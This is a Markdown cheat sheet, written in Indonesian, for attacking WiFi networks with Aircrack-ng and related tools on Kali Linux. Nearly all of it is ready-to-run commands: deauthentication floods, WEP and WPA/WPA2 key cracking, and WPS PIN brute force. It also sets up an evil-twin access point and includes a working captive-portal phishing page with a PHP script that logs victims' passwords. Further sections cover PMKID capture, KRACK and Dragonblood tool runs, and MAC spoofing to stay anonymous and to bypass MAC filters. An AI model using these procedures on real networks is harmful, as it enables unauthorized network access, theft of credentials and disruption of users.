# Aircrack-ng Complete Cheat Sheet - Kali Linux + TP-Link TL-WN722N v1

## Daftar Isi
1. [Hardware Setup - TP-Link TL-WN722N v1](#hardware-setup)
2. [Driver Installation & Configuration](#driver-installation)
3. [Monitor Mode Activation](#monitor-mode-activation)
4. [Aircrack-ng Suite Tools](#aircrack-ng-suite-tools)
5. [WEP Cracking](#wep-cracking)
6. [WPA/WPA2 Cracking](#wpawpa2-cracking)
7. [WPS Attacks](#wps-attacks)
8. [Evil Twin & Fake AP](#evil-twin--fake-ap)
9. [Advanced Techniques](#advanced-techniques)
10. [Troubleshooting](#troubleshooting)

---

## Hardware Setup - TP-Link TL-WN722N v1

### Spesifikasi TP-Link TL-WN722N v1

| Spec | Detail |
|------|--------|
| **Chipset** | Atheros AR9271 |
| **Driver** | ath9k_htc |
| **Monitor Mode** | Supported |
| **Packet Injection** | Supported |
| **Frequency** | 2.4 GHz |
| **Power** | 150 Mbps |
| **Best For** | WiFi pentesting |

 **PENTING:** Pastikan Anda punya **Version 1** (v1) bukan v2 atau v3!
- **v1** = Atheros AR9271 (BAGUS untuk pentesting)
- **v2/v3** = Realtek chipset ❌ (TIDAK support monitor mode dengan baik)

### Cek Version Hardware

```bash
# Plug in adapter, kemudian check
lsusb

# Cari output seperti:
# v1: Bus 001 Device 003: ID 0cf3:9271 Atheros Communications, Inc. AR9271 802.11n
# v2: Bus 001 Device 003: ID 2357:010c TP-Link TL-WN722N v2/v3 [Realtek RTL8188EUS]

# Atau check dengan:
dmesg | grep -i "usb\|wlan\|ath9k"

# Output v1:
# usb 1-1: Atheros AR9271 Rev:1
# ath9k_htc: USB layer initialized
```

### Physical Setup

```
1. Plug USB adapter ke Kali Linux (VM atau bare metal)
2. Jika VM: Enable USB passthrough
   - VirtualBox: Devices → USB → TP-Link TL-WN722N
   - VMware: VM → Removable Devices → TP-Link → Connect
3. Pastikan adapter detected
4. Optional: Gunakan USB extension untuk better signal
```

---

## 🔧 Driver Installation & Configuration

### Check Driver Status

```bash
# Check jika adapter detected
iwconfig

# Expected output:
# wlan0     IEEE 802.11  ESSID:off/any
#           Mode:Managed  Access Point: Not-Associated
#           ...

# Check driver loaded
lsmod | grep ath9k

# Expected output:
# ath9k_htc              81920  0
# ath9k_common           20480  1 ath9k_htc
# ath9k_hw              495616  2 ath9k_htc,ath9k_common
# ath                    32768  3 ath9k_htc,ath9k_hw,ath9k_common

# Check interface details
iw dev

# Check USB info
lsusb -vv | grep -A 10 "Atheros"
```

### Install/Update Drivers (jika perlu)

```bash
# Update system
sudo apt update
sudo apt upgrade -y

# Install wireless tools
sudo apt install -y aircrack-ng wireless-tools net-tools

# Install firmware (biasanya sudah ada di Kali)
sudo apt install -y firmware-atheros

# Install additional tools
sudo apt install -y \
    reaver \
    pixiewps \
    bully \
    mdk4 \
    hashcat \
    hcxtools \
    hcxdumptool

# Reboot untuk apply changes
sudo reboot
```

### Interface Management

```bash
# List all network interfaces
ifconfig -a
# atau
ip link show

# Bring interface up
sudo ifconfig wlan0 up
# atau
sudo ip link set wlan0 up

# Bring interface down
sudo ifconfig wlan0 down

# Check interface mode
iwconfig wlan0

# Check if interface supports monitor mode
iw list | grep -A 10 "Supported interface modes"
# Should show: * monitor
```

---

## 📡 Monitor Mode Activation

### Method 1: Using airmon-ng (Recommended)

```bash
# Kill interfering processes
sudo airmon-ng check kill

# Output akan kill processes seperti:
# - NetworkManager
# - wpa_supplicant
# - dhclient

# Start monitor mode
sudo airmon-ng start wlan0

# Adapter name akan berubah ke: wlan0mon
# Check:
iwconfig
# Output: wlan0mon  IEEE 802.11  Mode:Monitor  ...

# Verify monitor mode active
iw dev wlan0mon info

# Stop monitor mode (untuk kembali ke managed mode)
sudo airmon-ng stop wlan0mon

# Restart NetworkManager (jika perlu internet)
sudo systemctl start NetworkManager
```

### Method 2: Manual with iwconfig

```bash
# Bring interface down
sudo ifconfig wlan0 down

# Set monitor mode
sudo iwconfig wlan0 mode monitor

# Bring interface up
sudo ifconfig wlan0 up

# Verify
iwconfig wlan0
# Mode:Monitor

# Back to managed mode
sudo ifconfig wlan0 down
sudo iwconfig wlan0 mode managed
sudo ifconfig wlan0 up
```

### Method 3: Using iw command

```bash
# Bring down interface
sudo ip link set wlan0 down

# Set monitor mode
sudo iw wlan0 set monitor none

# Bring up interface
sudo ip link set wlan0 up

# Verify
iw dev wlan0 info
# type monitor

# Back to managed mode
sudo ip link set wlan0 down
sudo iw wlan0 set type managed
sudo ip link set wlan0 up
```

### Set Specific Channel

```bash
# Set channel (1-14 untuk 2.4GHz)
sudo iwconfig wlan0mon channel 6

# Atau menggunakan iw
sudo iw dev wlan0mon set channel 6

# Verify
iwconfig wlan0mon
# Channel:6

# Set frequency (alternative)
sudo iwconfig wlan0mon freq 2.437G  # Channel 6
```

### Change MAC Address (Optional - untuk anonymity)

```bash
# Bring down interface
sudo ifconfig wlan0mon down

# Change MAC
sudo macchanger -r wlan0mon
# atau specific MAC
sudo macchanger -m 00:11:22:33:44:55 wlan0mon

# Bring up interface
sudo ifconfig wlan0mon up

# Verify
macchanger -s wlan0mon
# atau
ifconfig wlan0mon | grep ether
```

---

## 🛠️ Aircrack-ng Suite Tools

### Overview of Tools

| Tool | Fungsi |
|------|--------|
| **airmon-ng** | Enable/disable monitor mode |
| **airodump-ng** | Capture packets (WiFi scanner) |
| **aireplay-ng** | Inject packets (deauth, fake auth, etc) |
| **aircrack-ng** | Crack WEP/WPA keys |
| **airdecap-ng** | Decrypt captured files |
| **airdecloak-ng** | Remove WEP cloaking |
| **airbase-ng** | Create fake AP (Evil Twin) |
| **airolib-ng** | Manage WPA rainbow tables |
| **airserv-ng** | Allow remote aircrack usage |
| **airtun-ng** | Virtual tunnel interface |
| **packetforge-ng** | Create encrypted packets |
| **ivstools** | Tools untuk IVs files |
| **tkiptun-ng** | WPA/TKIP attack |
| **wesside-ng** | Automatic WEP cracker |
| **easside-ng** | Easy WEP cracker |

---

## 📊 Airodump-ng (WiFi Scanner)

### Basic Scanning

```bash
# Scan all channels
sudo airodump-ng wlan0mon

# Output columns:
# BSSID          - MAC address AP
# PWR            - Signal strength (-30 = excellent, -90 = poor)
# Beacons        - Beacon frames received
# #Data          - Data packets captured
# #/s            - Data packets per second
# CH             - Channel
# MB             - Max speed
# ENC            - Encryption (WEP, WPA, WPA2, WPA3)
# CIPHER         - Cipher (TKIP, CCMP, WEP)
# AUTH           - Authentication (PSK, MGT)
# ESSID          - Network name
```

### Scan Specific Channel

```bash
# Scan channel 6 only
sudo airodump-ng -c 6 wlan0mon

# Scan channels 1-11
sudo airodump-ng -c 1-11 wlan0mon

# Scan with channel hopping (2.4GHz)
sudo airodump-ng --band bg wlan0mon

# Show only WPA/WPA2 networks
sudo airodump-ng --encrypt WPA wlan0mon
```

### Capture Handshake

```bash
# Target specific AP dan save capture
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon
#                  ^           ^                    ^
#                  |           |                    |
#              channel    target BSSID         output file

# Output files:
# capture-01.cap       - Capture file (untuk crack)
# capture-01.csv       - CSV data
# capture-01.kismet.csv - Kismet format
# capture-01.kismet.netxml - Kismet XML

# With specific ESSID filter
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF --essid "TargetWiFi" -w capture wlan0mon

# Show only clients (stations)
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF --showack -w capture wlan0mon
```

### Advanced Airodump Options

```bash
# Update interval 1 second (faster refresh)
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture --update 1 wlan0mon

# Write to gps log
sudo airodump-ng --gps --gpsd -w capture wlan0mon

# Background mode
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture --background 1 wlan0mon

# Filter manufacturer (OUI)
sudo airodump-ng --manufacturer wlan0mon

# Show beacon frames
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF --beacons wlan0mon

# Output to specific format
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture --output-format pcap wlan0mon
```

### Reading Airodump Output

```
 BSSID              PWR  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
 AA:BB:CC:DD:EE:FF  -45      100      500   10   6  54e. WPA2 CCMP   PSK  MyWiFi
 
 BSSID              STATION            PWR   Rate    Lost    Frames  Probe
 AA:BB:CC:DD:EE:FF  11:22:33:44:55:66  -50   54e-54e    0       100  MyWiFi

# Explanation:
# PWR -45 = Very good signal (closer = better for attack)
# #Data 500 = Good (more data = more chance capture handshake)
# ENC WPA2 = Encryption type
# CIPHER CCMP = Use CCMP (AES) - more secure than TKIP
# AUTH PSK = Pre-Shared Key (normal WPA2-PSK)
# STATION = Connected client MAC address
```

---

## 🎯 Aireplay-ng (Packet Injection)

### Test Injection

```bash
# Test if injection works
sudo aireplay-ng --test wlan0mon

# Test against specific AP
sudo aireplay-ng --test wlan0 -a AA:BB:CC:DD:EE:FF

# Output should show:
# Injection is working!
# 30/30: 100%
```

### Deauthentication Attack (Most Common)

```bash
# Deauth specific client from AP
sudo aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon
#                         ^           ^                    ^
#                         |           |                    |
#                   # of packets  AP BSSID           Client MAC

# Deauth all clients from AP (broadcast)
sudo aireplay-ng --deauth 0 -a AA:BB:CC:DD:EE:FF wlan0mon
#                         ^
#                         |
#                  0 = unlimited (Ctrl+C to stop)

# Deauth with reason code
sudo aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 -D wlan0mon

# Aggressive deauth (faster)
sudo aireplay-ng --deauth 0 -a AA:BB:CC:DD:EE:FF --ignore-negative-one wlan0mon
```

### Fake Authentication (for WEP)

```bash
# Fake auth to AP
sudo aireplay-ng --fakeauth 0 -a AA:BB:CC:DD:EE:FF -h 00:11:22:33:44:55 wlan0mon
#                           ^           ^                    ^
#                           |           |                    |
#                    delay (0=once)  AP BSSID          Your MAC (adapter MAC)

# Reassociation attack
sudo aireplay-ng --fakeauth 6000 -o 1 -q 10 -a AA:BB:CC:DD:EE:FF wlan0mon
#                           ^      ^    ^
#                           |      |    |
#                      every 6000s  1=reassoc  send 10 at a time
```

### ARP Replay Attack (WEP)

```bash
# Capture and replay ARP packets
sudo aireplay-ng --arpreplay -b AA:BB:CC:DD:EE:FF -h 00:11:22:33:44:55 wlan0mon
#                             ^                        ^
#                             |                        |
#                        target BSSID              your MAC

# With packet limit
sudo aireplay-ng --arpreplay -b AA:BB:CC:DD:EE:FF -n 1000 wlan0mon
```

### Interactive Packet Replay

```bash
# Interactive packet selection
sudo aireplay-ng --interactive -b AA:BB:CC:DD:EE:FF wlan0mon

# Replay from capture file
sudo aireplay-ng --interactive -r capture.cap wlan0mon
```

### Fragmentation Attack (WEP)

```bash
# Generate PRGA (keystream)
sudo aireplay-ng --fragment -b AA:BB:CC:DD:EE:FF -h 00:11:22:33:44:55 wlan0mon

# Output: xor filename (untuk packetforge-ng)
```

### ChopChop Attack (WEP)

```bash
# Decrypt a packet without key
sudo aireplay-ng --chopchop -b AA:BB:CC:DD:EE:FF -h 00:11:22:33:44:55 wlan0mon

# Output: .cap file dengan decrypted packet
```

### Caffe-Latte Attack

```bash
# Attack client yang pernah connect (tanpa AP)
sudo aireplay-ng --caffe-latte -b AA:BB:CC:DD:EE:FF wlan0mon
```

---

## 🔓 WEP Cracking

WEP sudah outdated tapi masih ada yang pakai.

### Method 1: Basic WEP Crack (with clients)

```bash
# TERMINAL 1: Capture packets
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w wep_capture wlan0mon

# Wait until #Data > 10000 (minimal)
# Lebih banyak = lebih baik (50000+ ideal)

# TERMINAL 2: Accelerate dengan ARP replay (optional)
# First, fake auth
sudo aireplay-ng --fakeauth 0 -a AA:BB:CC:DD:EE:FF -h YOUR_MAC wlan0mon

# Then ARP replay
sudo aireplay-ng --arpreplay -b AA:BB:CC:DD:EE:FF -h YOUR_MAC wlan0mon

# TERMINAL 3: Crack when enough IVs collected
sudo aircrack-ng wep_capture-01.cap

# Output:
# KEY FOUND! [ XX:XX:XX:XX:XX ] (ASCII: password)
```

### Method 2: PTW Attack (Faster)

```bash
# PTW method needs less IVs (20000-40000)
sudo aircrack-ng -z wep_capture-01.cap

# Or specific BSSID
sudo aircrack-ng -b AA:BB:CC:DD:EE:FF wep_capture-01.cap
```

### Method 3: Wesside-ng (Automatic)

```bash
# Automatic WEP cracking
sudo wesside-ng -i wlan0mon

# Output: wep.cap with key
```

### WEP Key Formats

```
# 64-bit WEP = 5 ASCII chars atau 10 hex digits
# 128-bit WEP = 13 ASCII chars atau 26 hex digits
# 256-bit WEP = 29 ASCII chars atau 58 hex digits
```

---

## 🔐 WPA/WPA2 Cracking

### Complete Workflow

#### **Step 1: Scan Networks**

```bash
# Enable monitor mode
sudo airmon-ng start wlan0

# Scan for targets
sudo airodump-ng wlan0mon

# Note down:
# - BSSID (target MAC)
# - Channel
# - ESSID (WiFi name)
# - Check ada client connected (STATION)
```

#### **Step 2: Capture Handshake**

```bash
# TERMINAL 1: Start capturing on target
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w handshake wlan0mon

# Wait untuk melihat client connected
# Look for: "WPA handshake: AA:BB:CC:DD:EE:FF" di top-right

# TERMINAL 2: Deauth client untuk force reconnect (capture handshake)
sudo aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF -c CLIENT_MAC wlan0mon

# Atau deauth semua clients
sudo aireplay-ng --deauth 0 -a AA:BB:CC:DD:EE:FF wlan0mon

# Jika berhasil, di Terminal 1 akan muncul:
# [ WPA handshake: AA:BB:CC:DD:EE:FF ]
```

#### **Step 3: Verify Handshake**

```bash
# Check jika handshake captured
sudo aircrack-ng handshake-01.cap

# Output:
# 1 potential handshake(s) found

# Atau gunakan online checker
# https://www.aircrack-ng.org/doku.php?id=check_wpa_handshake
```

#### **Step 4: Crack with Wordlist**

```bash
# Crack dengan wordlist
sudo aircrack-ng -w /path/to/wordlist.txt -b AA:BB:CC:DD:EE:FF handshake-01.cap
#                   ^                          ^
#                   |                          |
#               wordlist                  target BSSID

# Common wordlists di Kali:
# /usr/share/wordlists/rockyou.txt (most common)
# /usr/share/wordlists/rockyou.txt.gz (extract first)

# Extract rockyou
sudo gunzip /usr/share/wordlists/rockyou.txt.gz

# Crack dengan rockyou
sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt -b AA:BB:CC:DD:EE:FF handshake-01.cap

# Output jika sukses:
# KEY FOUND! [ password123 ]
```

### Advanced Cracking Options

```bash
# Specify ESSID instead of BSSID
sudo aircrack-ng -w wordlist.txt -e "TargetWiFi" handshake-01.cap

# Use multiple capture files
sudo aircrack-ng -w wordlist.txt handshake-*.cap

# Show ASCII only
sudo aircrack-ng -w wordlist.txt -a 2 handshake-01.cap

# Specific key length (8-63 characters for WPA)
sudo aircrack-ng -w wordlist.txt -l 8 handshake-01.cap

# Use ESSID for optimization
sudo aircrack-ng -w wordlist.txt -e "TargetWiFi" -b AA:BB:CC:DD:EE:FF handshake-01.cap

# Quiet mode
sudo aircrack-ng -w wordlist.txt -q handshake-01.cap
```

### Convert to Hashcat Format

```bash
# Convert .cap to .hccapx (hashcat format)
# Install hcxtools if not installed
sudo apt install hcxtools

# Convert
hcxpcapngtool -o handshake.hccapx handshake-01.cap

# Atau untuk hashcat 6.0+
hcxpcapngtool -o handshake.22000 handshake-01.cap

# Crack dengan hashcat (GPU acceleration)
hashcat -m 22000 handshake.22000 wordlist.txt

# Hashcat dengan rules
hashcat -m 22000 handshake.22000 wordlist.txt -r /usr/share/hashcat/rules/best64.rule

# Show cracked passwords
hashcat -m 22000 handshake.22000 --show
```

---

## 📝 Creating Custom Wordlists

### Using Crunch

```bash
# Install crunch
sudo apt install crunch

# Generate wordlist (8 chars, lowercase + numbers)
crunch 8 8 abcdefghijklmnopqrstuvwxyz0123456789 -o wordlist.txt

# Pattern: password#### (4 digits)
crunch 12 12 -t password@@@@ -o wordlist.txt
# @ = lowercase
# , = uppercase
# % = numbers
# ^ = symbols

# Real example: Indonesia phone numbers
# Sering format: 08123456789 atau password08123456789
crunch 13 13 -t password08@@@@@@ -o indo_wordlist.txt

# Limit size (max 100MB)
crunch 8 10 abcdefghijklmnopqrstuvwxyz0123456789 -b 100mb -o START
```

### Using Cupp (Common User Passwords Profiler)

```bash
# Install cupp
git clone https://github.com/Mebus/cupp.git
cd cupp

# Interactive mode (berdasarkan target info)
python3 cupp.py -i

# Input info:
# - First name
# - Surname
# - Nickname
# - Birthdate
# - Partner name
# - Pet name
# - Company
# dll

# Download wordlist
python3 cupp.py -l

# Combine wordlists
python3 cupp.py -a wordlist1.txt wordlist2.txt -o combined.txt
```

### Using Cewl (Web scraping for wordlist)

```bash
# Scrape website for wordlist
cewl -d 2 -m 5 -w wordlist.txt https://target-website.com
#    ^    ^
#    |    |
# depth  min length

# Include emails
cewl -d 2 -m 5 -e -w wordlist.txt https://target-website.com

# Combine dengan john rules
cewl -d 2 -m 5 -w wordlist.txt https://target-website.com
john --wordlist=wordlist.txt --rules --stdout > wordlist_mutated.txt
```

### Wordlist Best Practices

```bash
# Sort dan remove duplicates
sort -u wordlist.txt -o wordlist_sorted.txt

# Combine multiple wordlists
cat wordlist1.txt wordlist2.txt | sort -u > combined.txt

# Filter by length (8-63 chars for WPA)
cat wordlist.txt | awk 'length($0) >= 8 && length($0) <= 63' > filtered.txt

# Add common suffixes (123, !, 2024, dll)
cat wordlist.txt | awk '{print $0"123"}' > wordlist_123.txt
cat wordlist.txt | awk '{print $0"!"}' > wordlist_exclaim.txt
cat wordlist.txt | awk '{print $0"2024"}' > wordlist_2024.txt
```

---

## 🔑 WPS Attacks

WPS (WiFi Protected Setup) sering vulnerable untuk brute force PIN.

### Method 1: Reaver

```bash
# Install reaver
sudo apt install reaver

# Scan for WPS enabled APs
sudo wash -i wlan0mon

# Output shows:
# BSSID              Ch  dBm  WPS  Lck  Vendor    ESSID
# AA:BB:CC:DD:EE:FF   6  -45  2.0  No   TP-Link   MyWiFi

# WPS column: 2.0 = WPS enabled
# Lck: No = Not locked (bisa attack)

# Attack dengan reaver (basic)
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -c 6 -vv
#                            ^               ^
#                            |               |
#                       target BSSID      channel

# Advanced options
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -c 6 -vv \
    -d 2 \        # Delay 2 seconds between attempts (prevent lockout)
    -T 0.5 \      # Timeout 0.5 seconds
    -r 3:15 \     # Sleep 15 seconds after 3 failures
    -N \          # No NACK messages
    -L \          # Ignore locked state
    -g 1          # Max DH errors

# Resume attack (jika terputus)
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -c 6 -vv -s /tmp/reaver.session

# Output jika sukses:
# [+] WPS PIN: '12345670'
# [+] WPA PSK: 'password123'
# [+] AP SSID: 'MyWiFi'
```

### Method 2: Bully

```bash
# Install bully
sudo apt install bully

# Attack
sudo bully wlan0mon -b AA:BB:CC:DD:EE:FF -c 6 -v 3
#                         ^               ^    ^
#                         |               |    |
#                    target BSSID      ch   verbosity

# Advanced options
sudo bully wlan0mon -b AA:BB:CC:DD:EE:FF -c 6 -v 3 \
    -d 2 \        # Delay
    -r 3:60 \     # Retry 3 times, wait 60 sec
    -L \          # Ignore locked
    -B            # Bruteforce mode
```

### Method 3: Pixiewps (PixieDust Attack)

PixieDust exploit kelemahan di beberapa WPS implementations.

```bash
# Install pixiewps
sudo apt install pixiewps

# Use reaver dengan pixiedust
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -c 6 -vv -K
#                                                         ^
#                                                         |
#                                              pixiewps mode

# Atau gunakan OneShot script (automated)
git clone https://github.com/nikita-yfh/OneShot-C.git
cd OneShot-C
make

# Run OneShot
sudo ./oneshot -i wlan0mon -b AA:BB:CC:DD:EE:FF -K

# Output jika vulnerable:
# [+] WPS PIN: '12345670'
# [+] WPA PSK: 'password123'
```

### WPS Attack Best Practices

```bash
# 1. Check jika WPS enabled
wash -i wlan0mon

# 2. Check jika locked (Lck column)
# - No = Bisa attack
# - Yes = Locked (biasanya after failed attempts)

# 3. Use delay untuk prevent lockout
reaver ... -d 2

# 4. Jika locked, tunggu atau try pixiewps
reaver ... -K

# 5. Monitoring real-time
# Terminal 1: Reaver attack
# Terminal 2: Airodump monitoring
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF wlan0mon
```

---

## 🎭 Evil Twin & Fake AP

### Create Fake AP with Airbase-ng

```bash
# Create fake AP
sudo airbase-ng -e "FreeWiFi" -c 6 wlan0mon
#                   ^           ^
#                   |           |
#               ESSID name   channel

# With specific BSSID
sudo airbase-ng -e "FreeWiFi" -a AA:BB:CC:DD:EE:FF -c 6 wlan0mon

# WPA2 fake AP
sudo airbase-ng -e "FreeWiFi" -Z 2 -W 1 -c 6 wlan0mon
#                             ^    ^
#                             |    |
#                         WPA2  WPA1

# Capture credentials
sudo airbase-ng -e "FreeWiFi" -P -C 30 -c 6 wlan0mon
#                             ^    ^
#                             |    |
#                        Respond  Beacon every 30ms
```

### Evil Twin Attack (Complete)

```bash
# Step 1: Start monitor mode
sudo airmon-ng start wlan0

# Step 2: Create fake AP (clone target)
sudo airbase-ng -e "TargetWiFi" -a AA:BB:CC:DD:EE:FF -c 6 wlan0mon

# Step 3: Configure at0 interface (created by airbase-ng)
sudo ifconfig at0 up
sudo ifconfig at0 10.0.0.1 netmask 255.255.255.0

# Step 4: Setup DHCP server
# Install dnsmasq
sudo apt install dnsmasq

# Create dnsmasq config
cat > /tmp/dnsmasq.conf << EOF
interface=at0
dhcp-range=10.0.0.10,10.0.0.100,12h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
server=8.8.8.8
log-queries
log-dhcp
EOF

# Start dnsmasq
sudo dnsmasq -C /tmp/dnsmasq.conf -d

# Step 5: Enable IP forwarding & NAT
sudo sysctl -w net.ipv4.ip_forward=1
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
sudo iptables -A FORWARD -i at0 -o eth0 -j ACCEPT

# Step 6: Deauth real AP clients
# Terminal 2:
sudo aireplay-ng --deauth 0 -a REAL_AP_BSSID wlan0mon

# Clients akan connect ke fake AP
# Monitor connections di dnsmasq log
```

### Captive Portal Attack

```bash
# Setup captive portal untuk phishing
# Install hostapd dan apache2
sudo apt install hostapd apache2

# Create fake login page
sudo mkdir -p /var/www/html/portal
sudo nano /var/www/html/portal/index.html

# Simple phishing page
cat > /var/www/html/portal/index.html << 'EOF'
<!DOCTYPE html>
<html>
<head><title>WiFi Login</title></head>
<body>
    <h2>WiFi Network Authentication</h2>
    <form action="capture.php" method="POST">
        Password: <input type="password" name="password">
        <button type="submit">Connect</button>
    </form>
</body>
</html>
EOF

# Capture script
cat > /var/www/html/portal/capture.php << 'EOF'
<?php
$password = $_POST['password'];
file_put_contents('/tmp/captured.txt', $password."\n", FILE_APPEND);
header('Location: http://google.com');
?>
EOF

# Redirect all HTTP to portal
sudo iptables -t nat -A PREROUTING -i at0 -p tcp --dport 80 -j DNAT --to-destination 10.0.0.1:80
sudo iptables -t nat -A PREROUTING -i at0 -p tcp --dport 443 -j DNAT --to-destination 10.0.0.1:80

# Monitor captured passwords
tail -f /tmp/captured.txt
```

### Using Fluxion (Automated Evil Twin)

```bash
# Install fluxion
git clone https://github.com/FluxionNetwork/fluxion.git
cd fluxion

# Install dependencies
sudo ./fluxion.sh -i

# Run fluxion
sudo ./fluxion.sh

# Follow menu:
# 1. Select language
# 2. Select interface (wlan0mon)
# 3. Scan networks
# 4. Select target
# 5. Select attack (Evil Twin)
# 6. Select captive portal template
# 7. Wait untuk victim input password

# Fluxion will:
# - Create fake AP
# - Deauth real AP
# - Present captive portal
# - Validate password dengan real AP
# - Show password when correct
```

---

## 🚀 Advanced Techniques

### PMKID Attack (No client needed!)

Serangan ini tidak perlu client connected ke AP.

```bash
# Install hcxdumptool & hcxtools
sudo apt install hcxdumptool hcxtools

# Capture PMKID
sudo hcxdumptool -i wlan0mon -o pmkid.pcapng --enable_status=1

# Wait 1-2 minutes
# Press Ctrl+C to stop

# Convert to hashcat format
hcxpcapngtool -o pmkid.22000 pmkid.pcapng

# Crack with hashcat
hashcat -m 22000 pmkid.22000 wordlist.txt

# Atau dengan aircrack-ng (versi terbaru)
aircrack-ng -w wordlist.txt pmkid.pcapng
```

### KRACK Attack (WPA2 vulnerability)

```bash
# Clone krackattacks scripts
git clone https://github.com/vanhoefm/krackattacks-scripts.git
cd krackattacks-scripts

# Install dependencies
sudo apt install libnl-3-dev libnl-genl-3-dev pkg-config libssl-dev net-tools git sysfsutils python-scapy python-pycryptodome

# Test if vulnerable
cd krackattack
./krack-test-client.py

# Run attack
./krack-all-zero-tk.py wlan0mon
```

### WPA3 Attacks

```bash
# Dragonblood attack (WPA3 vulnerability)
git clone https://github.com/vanhoefm/dragonslayer.git
cd dragonslayer

# Install
./setup.sh

# Test
./dragonslayer.sh wlan0mon

# Downgrade WPA3 to WPA2
# Use hostapd to create fake AP with WPA2 only
```

### Hidden SSID Discovery

```bash
# Method 1: Passive (wait for client)
sudo airodump-ng wlan0mon

# Hidden networks show as "<length: ?>
# Wait until client connects, ESSID akan revealed

# Method 2: Active deauth
# First find hidden network BSSID
sudo airodump-ng wlan0mon
# Note BSSID dengan <length: ?>

# Capture on that channel
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF wlan0mon

# Deauth clients (if any connected)
sudo aireplay-ng --deauth 5 -a AA:BB:CC:DD:EE:FF wlan0mon

# When client reconnects, ESSID revealed

# Method 3: Probe request sniffing
sudo airodump-ng wlan0mon --output-format csv -w probe

# Check CSV for probe requests
cat probe-01.csv | grep "AA:BB:CC:DD:EE:FF"
```

### MAC Filtering Bypass

```bash
# Step 1: Discover allowed MAC addresses
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF wlan0mon

# Note connected client MAC addresses (STATION column)

# Step 2: Change adapter MAC to allowed client
sudo ifconfig wlan0mon down
sudo macchanger -m 11:22:33:44:55:66 wlan0mon
sudo ifconfig wlan0mon up

# Step 3: Deauth real client (optional)
sudo aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon

# Step 4: Connect dengan spoofed MAC
# Use fake authentication or connect normally
```

### Rogue Access Point Detection

```bash
# Detect fake APs
sudo airodump-ng wlan0mon -w scan

# Look for:
# - Same ESSID, different BSSID
# - Same ESSID, same BSSID, different channel
# - Unusual signal strength changes

# Advanced: Use kismet
sudo apt install kismet
sudo kismet

# Kismet will detect:
# - Rogue APs
# - Evil Twin attacks
# - Deauth attacks
# - Hidden networks
```

---

## 🐛 Troubleshooting

### Common Issues & Solutions

#### **Issue 1: Adapter not detected**

```bash
# Check if plugged in
lsusb | grep Atheros

# If not showing, try:
sudo rmmod ath9k_htc
sudo modprobe ath9k_htc

# Reboot
sudo reboot

# Check again
iwconfig
```

#### **Issue 2: Monitor mode not working**

```bash
# Kill interfering processes
sudo airmon-ng check kill

# Restart NetworkManager after attack
sudo systemctl restart NetworkManager

# Manual monitor mode
sudo ifconfig wlan0 down
sudo iwconfig wlan0 mode monitor
sudo ifconfig wlan0 up

# Check
iwconfig wlan0
```

#### **Issue 3: No injection working**

```bash
# Test injection
sudo aireplay-ng --test wlan0mon

# If fails, try:
# 1. Different channel
sudo iwconfig wlan0mon channel 1
sudo aireplay-ng --test wlan0mon

# 2. Change MAC
sudo ifconfig wlan0mon down
sudo macchanger -r wlan0mon
sudo ifconfig wlan0mon up

# 3. Update drivers
sudo apt update
sudo apt install --reinstall firmware-atheros

# 4. Check if adapter supports injection
iw list | grep -A 10 "Supported interface modes"
```

#### **Issue 4: Can't capture handshake**

```bash
# Make sure:
# 1. Client is connected to AP
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF wlan0mon
# Check STATION column

# 2. Signal strength is good (PWR < -70)
# Move closer to AP

# 3. Deauth is working
# Try stronger deauth
sudo aireplay-ng --deauth 50 -a AA:BB:CC:DD:EE:FF wlan0mon

# 4. Client is actually reconnecting
# Some devices have protection against deauth

# 5. Alternative: Wait for natural reconnection
# Leave airodump running overnight
```

#### **Issue 5: Aircrack not finding handshake**

```bash
# Verify handshake manually
sudo aircrack-ng capture.cap

# If shows "0 handshakes", try:
# 1. Different capture
# 2. Online verifier
# https://hashcat.net/cap2hashcat/

# 3. Use wireshark
wireshark capture.cap
# Filter: eapol
# Should see 4-way handshake (4 packets)

# 4. Try tshark
tshark -r capture.cap -Y "eapol" | wc -l
# Should be >= 2 (minimal)
```

#### **Issue 6: WPS attack not working**

```bash
# Check if WPS enabled
wash -i wlan0mon | grep AA:BB:CC:DD:EE:FF

# If locked:
# - Wait 24 hours
# - Try pixiewps instead
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -c 6 -K

# If still fails:
# - AP may have WPS disabled via firmware update
# - Try different AP
```

#### **Issue 7: Weak signal (PWR > -70)**

```bash
# Solutions:
# 1. Move closer to AP
# 2. Use better antenna
# 3. Use USB extension cable
# 4. Use external high-gain antenna (if adapter supports)

# Check signal
watch -n 1 "sudo airodump-ng wlan0mon | grep AA:BB:CC:DD:EE:FF"

# Optimal signal: PWR -30 to -60
```

#### **Issue 8: TP-Link driver issues**

```bash
# Reinstall firmware
sudo apt update
sudo apt install --reinstall firmware-atheros

# Check dmesg for errors
dmesg | tail -20

# Common error: "firmware failed to load"
# Solution:
sudo apt install linux-firmware
sudo reboot

# If persists, try different USB port
```

